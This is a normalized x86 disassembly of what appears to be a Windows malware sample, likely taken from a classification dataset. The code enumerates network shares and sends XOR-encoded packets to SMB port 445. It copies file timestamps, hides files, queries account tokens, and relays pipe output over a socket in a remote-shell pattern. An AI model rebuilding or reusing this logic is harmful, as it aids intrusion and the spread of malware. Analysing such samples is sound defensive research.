test eax eax
push ebx
push esi
push edi
jne r-xdata
push rw-data
push rw-data
call sub_409797
mov edi eax
add esp 0x8
test edi edi
jne r-xdata
mov eax [ rw-data ]
or ecx 0xffffffff
mov [ rw-data ] 0x1
lea edx [ eax + 0x4 ]
xor eax eax
mov edi edx
[ edi ]
not ecx
dec ecx
mov ebx ecx
cmp ebx 0x114
jae r-xdata
mov esi [ rw-data ]
mov eax [ rw-data ]
push eax
call sub_4095ad
add esp 0x4
mov [ rw-data ] 0x45
call sub_405560
pop edi
pop esi
pop ebx
add esp 0x104
retn
pop edi
pop esi
pop ebx
add esp 0x104
retn
mov edi edx
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax [ rw-data ]
mov edx ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
cmp eax 0x56
[ edi ] [ esi ]
jne r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x4f
call sub_405560
push rw-data
call sub_406300
mov eax [ rw-data ]
add esp 0x4
cmp eax 0x56
jne r-xdata
push 0x0
push rw-data
call [ rw-data ]
mov ecx [ rw-data ]
cmp [ ecx ] 0x0
je r-xdata
lea eax [ esp + 0x10 ]
push 0x100
push eax
call [ rw-data ]
or ecx 0xffffffff
mov edi rw-data
xor eax eax
lea edx [ esp + 0x10 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ esp + 0x10 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
push rw-data
call sub_406f20
add esp 0x4
push rw-data
push rw-data
jmp r-xdata
mov eax [ rw-data ]
mov edx [ rw-data ]
sub eax ebx
lea esi [ edx + ebx + 0x5 ]
sub eax 0x5
jmp r-xdata
mov [ rw-data ] 0x45
call sub_405560
pop edi
pop esi
pop ebx
add esp 0x104
retn
push rw-data
call sub_409797
mov edi eax
add esp 0x8
test edi edi
jne r-xdata
lea ecx [ esp + 0xc ]
mov [ esp + 0xc ] eax
push ecx
push esi
push eax
push esi
call sub_403b30
mov edx [ esp + 0x1c ]
push edi
push edx
push 0x1
push esi
call sub_4097aa
push edi
call sub_4095ad
mov eax [ rw-data ]
add esp 0x24
test eax eax
je r-xdata
sub_406300
sub esp 0x408
lea eax [ esp + 0x8 ]
push ebx
push esi
push edi
push 0x400
push eax
call [ rw-data ]
push 0x0
push 0x2000000
push 0x3
push 0x0
push 0x5
lea ecx [ esp + 0x28 ]
push 0x80000000
push ecx
call [ rw-data ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x408
retn
mov ebx [ esp + 0x418 ]
push 0x0
push 0x80
push 0x3
push 0x0
push 0x0
push 0x40000000
push ebx
call [ rw-data ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
push 0x0
lea edx [ esp + 0x10 ]
push 0x0
push edx
push edi
call [ GetFileTime@IAT ]
lea eax [ esp + 0xc ]
lea ecx [ esp + 0xc ]
push eax
lea edx [ esp + 0x10 ]
push ecx
push edx
push esi
call [ SetFileTime@IAT ]
push edi
call [ rw-data ]
push esi
call [ rw-data ]
push ebx
call [ GetFileAttributesA@IAT ]
or al 0x2
push eax
push ebx
call [ rw-data ]
push edi
call [ rw-data ]
pop edi
pop esi
pop ebx
add esp 0x408
retn
sub_4063d0
sub esp 0x4c4
mov ecx [ esp + 0x4c8 ]
lea eax [ esp + 0x4 ]
push eax
push 0x20008
push ecx
mov [ esp + 0x14 ] 0x100
mov [ esp + 0xc ] 0xc8
call [ OpenProcessToken@IAT ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x4 ]
lea edx [ esp + 0xc ]
push edx
lea eax [ esp + 0xe0 ]
push 0x3e8
push eax
push 0x1
push ecx
call [ GetTokenInformation@IAT ]
test eax eax
jne r-xdata
add esp 0x4c4
retn
lea edx [ esp + 0x10 ]
lea eax [ esp ]
push edx
lea ecx [ esp + 0x18 ]
push eax
mov eax [ esp + 0x4d4 ]
lea edx [ esp + 0x10 ]
push ecx
mov ecx [ esp + 0xe8 ]
push edx
push eax
push ecx
push 0x0
call [ LookupAccountSidA@IAT ]
neg eax
sbb eax eax
neg eax
add esp 0x4c4
retn
add esp 0x4c4
retn
sub_406470
mov eax 0x4240
call sub_4094d0
push ebx
push ebp
push esi
push edi
push rw-data
call [ LoadLibraryA@IAT ]
mov edi eax
xor esi esi
cmp edi esi
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x4240
retn
mov ebx [ GetProcAddress@IAT ]
push rw-data
push edi
call ebx
mov ebp eax
push rw-data
push edi
mov [ esp + 0x18 ] ebp
call ebx
mov ebx eax
push edi
mov [ esp + 0x28 ] ebx
call [ FreeLibrary@IAT ]
cmp ebp esi
je r-xdata
cmp ebx esi
je r-xdata
mov eax 0x2
push rw-data
mov [ esp + 0x30 ] eax
mov [ esp + 0x3c ] eax
mov eax [ rw-data ]
mov [ esp + 0x34 ] esi
push eax
mov [ esp + 0x3c ] 0x3
mov [ esp + 0x44 ] esi
mov [ esp + 0x48 ] esi
mov [ esp + 0x4c ] esi
mov [ esp + 0x50 ] esi
mov [ esp + 0x20 ] esi
mov [ esp + 0x24 ] 0x4000
mov [ esp + 0x1c ] 0xffffffff
mov ebx 0x5
mov [ esp + 0x258 ] 0x47
call sub_4093b0
add esp 0x8
mov edi eax
cmp edi esi
push 0x5c
je r-xdata
mov ecx [ rw-data ]
push ecx
call sub_409000
add esp 0x8
cmp eax esi
je r-xdata
lea ecx [ edi + 0x3 ]
push ecx
call sub_4092f0
mov ebp eax
add esp 0x8
cmp ebp esi
je r-xdata
mov [ esp + 0x255 ] 0x0
mov ebx 0x6
mov [ eax ] 0x0
mov ecx [ rw-data ]
cmp eax ecx
je r-xdata
lea edx [ ebp + 0x1 ]
push 0x5c
push edx
call sub_4092f0
add esp 0x8
test eax eax
je r-xdata
lea edx [ esp + 0x20 ]
lea eax [ esp + 0x2c ]
push edx
push eax
push esi
push esi
push 0x2
call ebp
test eax eax
jne r-xdata
push 0x5c
push ecx
call sub_409000
add esp 0x8
cmp eax esi
je r-xdata
inc edi
mov [ ebp ] 0x0
mov ebp [ esp + 0x10 ]
mov [ esp + 0x40 ] edi
jmp r-xdata
inc edi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi [ rw-data ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
call sub_405150
pop edi
pop esi
pop ebp
pop ebx
add esp 0x4240
retn
mov ecx [ esp + 0x1c ]
push ecx
push 0x40
call [ GlobalAlloc@IAT ]
mov esi eax
mov [ esp + 0x28 ] esi
mov edx [ rw-data ]
lea ecx [ eax + 0x1 ]
cmp edx 0x2
mov [ esp + 0x40 ] ecx
jne r-xdata
push esi
call [ GlobalFree@IAT ]
mov edx [ esp + 0x20 ]
push edx
call WNetCloseEnum
cmp ebx 0x5
jne r-xdata
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x14 ]
test eax eax
jbe r-xdata
cmp eax [ rw-data ]
jne r-xdata
cmp eax [ rw-data ]
jne r-xdata
lea eax [ esp + 0x4c ]
lea ecx [ esp + 0x255 ]
push eax
lea edx [ ebx - 0x5 ]
push ecx
lea eax [ esp + 0x25d ]
push edx
push eax
mov [ esp + 0x261 ] ebx
call sub_403b30
lea ecx [ esp + 0x260 ]
push ebx
push ecx
call sub_403320
add esp 0x18
mov ecx [ esp + 0x1c ]
xor eax eax
mov edx ecx
mov edi esi
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov edx [ esp + 0x20 ]
lea eax [ esp + 0x1c ]
push eax
lea ecx [ esp + 0x18 ]
push esi
push ecx
push edx
call [ esp + 0x34 ]
test eax eax
jne r-xdata
lea ebp [ esi + 0x14 ]
mov [ esp + 0x18 ] 0x1
mov [ esp + 0x34 ] 0x6
mov [ esp + 0x38 ] 0x80000002
mov [ esp + 0x48 ] ecx
jmp r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
inc eax
add ebp 0x20
cmp eax ecx
mov [ esp + 0x10 ] eax
jb r-xdata
cmp [ ebp - 0x10 ] 0x1
jne r-xdata
mov eax [ ebp ]
test eax eax
je r-xdata
jmp r-xdata
mov edi [ ebp ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + ebx + 0x250 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edx [ ebp ]
or ecx 0xffffffff
mov edi edx
[ edi ]
mov eax [ esp + 0x18 ]
not ecx
dec ecx
add ebx ecx
test eax eax
je r-xdata
add eax 0x2
push 0x5c
push eax
call sub_4092f0
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov esi [ esp + 0x28 ]
inc ebx
mov [ esp + ebx + 0x250 ] ecx
add ebx 0x4
lea ecx [ esp + 0x50 ]
push ecx
push edx
call sub_4067c0
lea edi [ esp + 0x58 ]
or ecx 0xffffffff
xor eax eax
add esp 0x8
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + ebx + 0x250 ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x50 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
add ebx ecx
inc eax
mov [ ebp ] eax
sub_4067c0
cmp [ rw-data ] 0x1
jne r-xdata
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
push edx
push eax
call sub_406800
add esp 0x8
retn
mov ecx [ esp + 0x4 ]
mov eax [ esp + 0x8 ]
add ecx 0x2
push eax
push ecx
call sub_406ae0
add esp 0x8
retn
sub_406800
sub esp 0x448
push ebx
mov ebx [ esp + 0x450 ]
push ebp
push esi
lea eax [ ebx + 0x2 ]
push edi
push eax
call [ Ordinal_WSOCK32_52@IAT ]
test eax eax
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x18 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ eax + 0xc ]
mov edx [ ecx ]
mov eax [ edx ]
push eax
call [ Ordinal_WSOCK32_11@IAT ]
push eax
lea ecx [ esp + 0x1c ]
push rw-data
push ecx
call sub_409157
add esp 0xc
jmp r-xdata
push rw-data
call [ LoadLibraryA@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x18 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov al [ esp + 0x18 ]
test al al
jne r-xdata
mov edi [ GetProcAddress@IAT ]
push rw-data
push esi
call edi
mov ebp eax
test ebp ebp
jne r-xdata
mov ecx [ esp + 0x460 ]
push rw-data
push ecx
call sub_409157
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
add esp 0x448
retn
push rw-data
push esi
call edi
test eax eax
mov [ esp + 0x14 ] eax
je r-xdata
lea edx [ esp + 0x18 ]
push edx
push rw-data
jmp r-xdata
lea edx [ esp + 0x18 ]
push edx
push rw-data
lea ecx [ esp + 0x58 ]
push 0x200
push ecx
mov edi ebx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
push ecx
push ebx
push eax
push eax
mov [ esp + 0x28 ] 0x0
call [ MultiByteToWideChar@IAT ]
lea edx [ esp + 0x58 ]
lea eax [ esp + 0x258 ]
push edx
push rw-data
push eax
call sub_4098b4
add esp 0xc
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x258 ]
push ecx
push 0x65
push edx
call ebp
test eax eax
jne r-xdata
mov eax [ esp + 0x468 ]
push eax
call sub_409157
add esp 0xc
mov ecx [ esp + 0x460 ]
lea eax [ esp + 0x18 ]
push eax
push rw-data
push ecx
call sub_409157
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x448
retn
mov ecx [ esp + 0x10 ]
mov eax [ ecx ]
cmp eax 0x1f4
ja r-xdata
sub eax 0x258
je r-xdata
je r-xdata
lea edx [ esp + 0x18 ]
push edx
push rw-data
sub eax 0x64
je r-xdata
mov eax [ ecx + 0x8 ]
cmp eax 0x5
jne r-xdata
sub eax 0x12c
je r-xdata
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov [ ecx + esi - 0x1 ] 0x53
mov [ ecx + esi ] 0x5d
mov [ ecx + esi + 0x1 ] al
mov eax [ esp + 0x10 ]
test ch 0x80
je r-xdata
lea ecx [ esp + 0x18 ]
push ecx
push rw-data
jmp r-xdata
lea eax [ esp + 0x18 ]
push eax
push rw-data
jmp r-xdata
mov ecx [ ecx + 0xc ]
lea edx [ esp + 0x18 ]
push ecx
push eax
push edx
jmp r-xdata
mov eax [ ecx + 0xc ]
test eax eax
jne r-xdata
lea edx [ esp + 0x18 ]
push edx
push rw-data
jmp r-xdata
sub eax 0x64
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x448
retn
push eax
call [ esp + 0x18 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x448
retn
test eax eax
je r-xdata
mov esi [ esp + 0x468 ]
push esi
call sub_409157
add esp 0xc
mov esi [ esp + 0x46c ]
push rw-data
push esi
call sub_409157
add esp 0x14
jmp r-xdata
cmp eax 0x1
jne r-xdata
lea eax [ esp + 0x18 ]
push eax
push rw-data
jmp r-xdata
cmp [ ecx + 0x8 ] 0x4
jne r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ eax + 0x10 ]
test cl 0x18
jne r-xdata
cmp eax 0x2
jne r-xdata
lea ecx [ esp + 0x18 ]
push ecx
push rw-data
jmp r-xdata
lea ecx [ esp + 0x18 ]
push ecx
push rw-data
jmp r-xdata
lea eax [ esp + 0x18 ]
push eax
push rw-data
jmp r-xdata
push eax
lea eax [ esp + 0x1c ]
push 0x5
push eax
lea edx [ esp + 0x18 ]
push edx
push rw-data
jmp r-xdata
sub_406ae0
sub esp 0x358
mov ecx 0x22
xor eax eax
push esi
push edi
mov esi rw-data
lea edi [ esp + 0x44 ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov ecx 0x2a
mov esi rw-data
lea edi [ esp + 0xd0 ]
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov ecx 0x37
mov esi rw-data
lea edi [ esp + 0x17c ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov cl [ esp + eax + 0x44 ]
xor cl 0x93
mov [ esp + eax + 0x44 ] cl
inc eax
cmp eax 0x89
jb r-xdata
xor eax eax
mov cl [ esp + eax + 0xd0 ]
xor cl 0x93
mov [ esp + eax + 0xd0 ] cl
inc eax
cmp eax 0xa8
jb r-xdata
xor eax eax
mov cl [ esp + eax + 0x17c ]
xor cl 0x93
mov [ esp + eax + 0x17c ] cl
inc eax
cmp eax 0xde
jb r-xdata
mov eax [ esp + 0x364 ]
push eax
call [ Ordinal_WSOCK32_52@IAT ]
test eax eax
je r-xdata
lea edx [ esp + 0x24 ]
mov edi rw-data
mov ecx [ eax + 0xc ]
mov edx [ ecx ]
mov eax [ edx ]
push eax
call [ Ordinal_WSOCK32_11@IAT ]
lea edx [ esp + 0x24 ]
mov edi eax
jmp r-xdata
mov edi 0x1
push 0x0
push edi
push 0x2
call [ Ordinal_WSOCK32_23@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi [ esp + 0x368 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
add esp 0x358
retn
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov al [ esp + 0x24 ]
test al al
jne r-xdata
push 0x1bd
mov [ esp + 0x18 ] 0x2
call [ Ordinal_WSOCK32_9@IAT ]
lea edx [ esp + 0x24 ]
mov [ esp + 0x16 ] ax
push edx
call [ Ordinal_WSOCK32_10@IAT ]
mov [ esp + 0x18 ] eax
lea ecx [ esp + 0x8 ]
xor eax eax
push ecx
mov [ esp + 0x20 ] eax
push 0x8004667e
push esi
mov [ esp + 0x2c ] eax
mov [ esp + 0x14 ] edi
call [ Ordinal_WSOCK32_12@IAT ]
lea edx [ esp + 0x14 ]
push 0x10
push edx
push esi
mov [ esp + 0x18 ] 0x2
mov [ esp + 0x1c ] 0x0
mov [ esp + 0x26c ] esi
mov [ esp + 0x268 ] edi
call [ rw-data ]
lea eax [ esp + 0xc ]
lea ecx [ esp + 0x25c ]
push eax
push 0x0
push ecx
lea edx [ esi + 0x1 ]
push 0x0
push edx
call [ Ordinal_WSOCK32_18@IAT ]
test eax eax
jg r-xdata
mov ecx [ esp + 0x368 ]
lea eax [ esp + 0x24 ]
push eax
push rw-data
push ecx
call sub_409157
add esp 0xc
pop edi
pop esi
add esp 0x358
retn
push edi
mov edi [ esp + 0x36c ]
lea edx [ esp + 0x28 ]
push edi
push edx
lea eax [ esp + 0x50 ]
push 0x89
push eax
push esi
call sub_406d60
add esp 0x18
test eax eax
je r-xdata
mov ecx [ esp + 0x368 ]
lea eax [ esp + 0x24 ]
push eax
push rw-data
push ecx
call sub_409157
add esp 0xc
push esi
call [ Ordinal_WSOCK32_3@IAT ]
pop edi
pop esi
add esp 0x358
retn
pop edi
pop esi
add esp 0x358
retn
push 0x2
lea ecx [ esp + 0x28 ]
push edi
push ecx
lea edx [ esp + 0xdc ]
push 0xa8
push edx
push esi
call sub_406d60
add esp 0x18
test eax eax
je r-xdata
push 0x3
lea eax [ esp + 0x28 ]
push edi
push eax
lea ecx [ esp + 0x188 ]
push 0xde
push ecx
push esi
call sub_406d60
add esp 0x18
push esi
call [ Ordinal_WSOCK32_3@IAT ]
sub_406d60
mov eax 0x1120
call sub_4094d0
push ebx
push ebp
mov ebp [ Ordinal_WSOCK32_12@IAT ]
push esi
mov esi [ esp + 0x1130 ]
lea eax [ esp + 0xc ]
push edi
push eax
mov edi 0x1
push 0x8004667e
push esi
mov [ esp + 0x1c ] edi
call ebp
mov ecx [ esp + 0x113c ]
mov edx [ esp + 0x1138 ]
push 0x0
push ecx
push edx
push esi
mov [ esp + 0x24 ] 0x2
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x40 ] esi
mov [ esp + 0x3c ] edi
call [ rw-data ]
mov ebx [ Ordinal_WSOCK32_18@IAT ]
lea eax [ esp + 0x14 ]
push eax
lea ecx [ esp + 0x30 ]
push 0x0
lea edi [ esi + 0x1 ]
push ecx
push 0x0
push edi
call ebx
test eax eax
jg r-xdata
lea ecx [ esp + 0x10 ]
mov [ esp + 0x10 ] 0x1
push ecx
push 0x8004667e
push esi
call ebp
lea edx [ esp + 0x14 ]
lea eax [ esp + 0x2c ]
push edx
push 0x0
push 0x0
push eax
push edi
mov [ esp + 0x28 ] 0x4
mov [ esp + 0x2c ] 0x0
mov [ esp + 0x44 ] esi
mov [ esp + 0x40 ] 0x1
call ebx
test eax eax
jle r-xdata
mov edx [ esp + 0x1140 ]
mov eax [ esp + 0x1144 ]
push edx
push rw-data
push eax
call sub_409157
add esp 0xc
push esi
call [ Ordinal_WSOCK32_3@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x1120
retn
mov edx [ esp + 0x1140 ]
mov eax [ esp + 0x1144 ]
push edx
push rw-data
push eax
call sub_409157
add esp 0xc
push esi
call [ Ordinal_WSOCK32_3@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x1120
retn
push 0x0
lea ecx [ esp + 0x134 ]
push 0x640
push ecx
push esi
call [ Ordinal_WSOCK32_16@IAT ]
cmp eax 0xffffffff
jne r-xdata
cmp [ esp + 0x1148 ] 0x3
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x1120
retn
xor eax eax
lea ecx [ esp + 0x160 ]
mov dl [ ecx ]
add ecx 0x2
mov [ esp + eax + 0x1c ] dl
inc eax
cmp eax 0xc
jl r-xdata
mov ecx [ esp + 0x1140 ]
mov edx [ esp + 0x1144 ]
mov [ esp + eax + 0x1c ] 0x0
lea eax [ esp + 0x1c ]
push eax
push ecx
push rw-data
push edx
call sub_409157
add esp 0x10
sub_406f00
push 0x0
push rw-data
call sub_401c00
add esp 0x8
push 0x1
call sub_409054
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
sub_406f20
sub esp 0x258
push ebp
push edi
push rw-data
call [ LoadLibraryA@IAT ]
push rw-data
push eax
call [ GetProcAddress@IAT ]
mov ebp [ esp + 0x264 ]
push rw-data
push ebp
mov [ esp + 0x10 ] eax
call sub_4093b0
add esp 0x8
test eax eax
jne r-xdata
mov ecx 0x11
xor eax eax
lea edi [ esp + 0x1c ]
lea edx [ esp + 0x1c ]
[ edi ]
lea ecx [ esp + 0xc ]
mov [ esp + 0x48 ] 0x1
push ecx
push edx
push eax
push eax
push eax
push eax
push eax
push eax
push ebp
push eax
mov [ esp + 0x74 ] ax
call [ rw-data ]
pop edi
pop ebp
add esp 0x258
retn
mov edi ebp
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
push esi
lea edx [ esp + 0x64 ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
push 0x22
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x68 ]
push ecx
call sub_4092f0
add esp 0x8
test eax eax
pop esi
je r-xdata
inc eax
push 0x22
push eax
call sub_4092f0
add esp 0x8
test eax eax
je r-xdata
lea edx [ esp + 0x60 ]
push 0x5c
push edx
mov [ eax ] 0x0
call sub_409000
add esp 0x8
test eax eax
je r-xdata
cmp [ eax - 0x1 ] 0x3a
jne r-xdata
mov [ eax ] 0x0
mov [ eax + 0x1 ] 0x0
jmp r-xdata
lea eax [ esp + 0x61 ]
push eax
call [ esp + 0xc ]
sub_407010
push ecx
mov [ rw-data ] 0x4f
call sub_405560
mov eax [ rw-data ]
test eax eax
jne r-xdata
pop ecx
retn
lea eax [ esp ]
push eax
push 0x0
push 0x0
push sub_407040
push 0x0
push 0x0
call [ CreateThread@IAT ]
sub_407040
mov eax 0x153c
call sub_4094d0
push ebx
push ebp
push esi
push edi
push rw-data
call [ LoadLibraryA@IAT ]
mov edi [ GetProcAddress@IAT ]
mov esi eax
push rw-data
push esi
call edi
push rw-data
push esi
mov [ esp + 0x24 ] eax
call edi
mov esi eax
mov eax 0x1
xor ebp ebp
mov [ rw-data ] eax
mov [ esp + 0x34 ] eax
lea eax [ esp + 0x2c ]
push ebp
lea ecx [ esp + 0x28 ]
push eax
lea edx [ esp + 0x20 ]
or ebx 0xffffffff
push ecx
push edx
mov [ esp + 0x20 ] ebp
mov [ esp + 0x24 ] ebx
mov [ esp + 0x3c ] 0xc
mov [ esp + 0x40 ] ebp
call esi
lea eax [ esp + 0x2c ]
push ebp
lea ecx [ esp + 0x24 ]
push eax
lea edx [ esp + 0x30 ]
push ecx
push edx
call esi
mov ecx 0x11
xor eax eax
lea edi [ esp + 0x50 ]
mov edx [ rw-data ]
[ edi ]
mov eax [ esp + 0x28 ]
mov ecx [ rw-data ]
mov [ esp + 0x88 ] eax
mov eax [ esp + 0x24 ]
mov [ esp + 0x90 ] eax
mov [ esp + 0x8c ] eax
mov [ esp + 0x38 ] ecx
lea eax [ esp + 0x40 ]
lea ecx [ esp + 0x50 ]
push eax
push ecx
push ebp
push ebp
push ebp
mov [ esp + 0x50 ] edx
push 0x1
push ebp
lea edx [ esp + 0x54 ]
push ebp
push edx
push ebp
mov [ esp + 0xa4 ] 0x101
mov [ esp + 0xa8 ] bp
call [ rw-data ]
push 0x3e8
call [ rw-data ]
call sub_407420
mov ebp eax
test ebp ebp
je r-xdata
mov edx [ esp + 0x40 ]
push 0x0
push edx
call [ esp + 0x24 ]
pop edi
pop esi
pop ebp
mov [ rw-data ] 0x0
mov eax 0x1
pop ebx
add esp 0x153c
retn 0x4
mov eax [ rw-data ]
lea edx [ esp + 0x94 ]
test eax eax
mov edi rw-data
jne r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
mov edx [ rw-data ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x94 ]
or ecx 0xffffffff
[ edi ]
not ecx
add ecx 0x3
push ecx
mov ecx [ rw-data ]
push 0x1
push rw-data
push ecx
push edx
call [ Ordinal_WSOCK32_11@IAT ]
push eax
lea eax [ esp + 0x1a8 ]
push eax
call sub_403760
lea edi [ esp + 0x1ac ]
or ecx 0xffffffff
xor eax eax
add esp 0x18
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x94 ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x94 ]
mov [ esp + edx + 0x194 ] ecx
or ecx 0xffffffff
add edx 0x4
lea esi [ esp + 0x94 ]
[ edi ]
not ecx
dec ecx
lea edi [ esp + edx + 0x194 ]
mov eax ecx
push 0x0
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x98 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
add ecx edx
push ecx
lea ecx [ esp + 0x19c ]
push ecx
push ebp
call [ rw-data ]
push 0x64
mov edi rw-data
test ebx ebx
jg r-xdata
mov ecx [ esp + 0x18 ]
lea edx [ esp + 0x10 ]
push 0x0
push edx
push eax
lea eax [ esp + 0xd58 ]
push eax
push ecx
call [ ReadFile@IAT ]
test eax eax
je r-xdata
cmp ebx 0x7ff
mov eax 0x7ff
ja r-xdata
push ebp
call sub_403a50
add esp 0x4
test eax eax
je r-xdata
push ebp
call [ Ordinal_WSOCK32_3@IAT ]
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x0
lea ecx [ esp + 0xd50 ]
push eax
push ecx
push ebp
call [ Ordinal_WSOCK32_16@IAT ]
test eax eax
jle r-xdata
mov eax ebx
cmp eax 0xffffffff
je r-xdata
mov edx [ esp + 0x10 ]
mov eax [ rw-data ]
mov ecx [ rw-data ]
add edx 0x4
push edx
push 0x1
push rw-data
push eax
push ecx
call [ Ordinal_WSOCK32_11@IAT ]
lea edx [ esp + 0x1a4 ]
push eax
push edx
call sub_403760
lea edi [ esp + 0x1ac ]
or ecx 0xffffffff
xor eax eax
add esp 0x18
[ edi ]
mov eax [ esp + 0x10 ]
lea esi [ esp + 0xd4c ]
not ecx
dec ecx
mov ebx ecx
mov ecx eax
mov edx ecx
mov [ esp + ebx + 0x194 ] eax
add ebx 0x4
shr ecx 0x2
lea edi [ esp + ebx + 0x194 ]
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
add ebx eax
[ edi ] [ esi ]
push ebp
mov [ esp + 0x18 ] 0xffffffff
call [ Ordinal_WSOCK32_3@IAT ]
push 0x64
call [ rw-data ]
call sub_407420
mov ebp eax
test ebp ebp
je r-xdata
mov ecx [ esp + 0x20 ]
lea edx [ esp + 0x10 ]
push 0x0
push edx
sub ebx eax
push eax
lea eax [ esp + 0xd58 ]
mov [ esp + 0x20 ] ebx
push eax
push ecx
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp eax 0x3e800
jge r-xdata
sub ebx eax
test ebx ebx
jg r-xdata
push 0xa
jmp r-xdata
push ebp
call sub_4074c0
add esp 0x4
cmp eax 0xffffffff
mov [ esp + 0x14 ] eax
je r-xdata
push 0x0
lea eax [ esp + 0x198 ]
push ebx
push eax
push ebp
call [ rw-data ]
test eax eax
jl r-xdata
push 0xa
call [ rw-data ]
mov ebx [ esp + 0x14 ]
jmp r-xdata
call [ rw-data ]
mov ebx eax
mov ecx [ esp + 0x18 ]
push 0x0
lea edx [ esp + 0x14 ]
push 0x0
push edx
lea eax [ esp + 0xd58 ]
push 0x800
push eax
push ecx
call [ PeekNamedPipe@IAT ]
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
sub_407420
sub esp 0x10
push ebx
mov ebx [ rw-data ]
push esi
push edi
mov edi [ rw-data ]
push 0x0
push 0x1
push 0x2
call [ Ordinal_WSOCK32_23@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
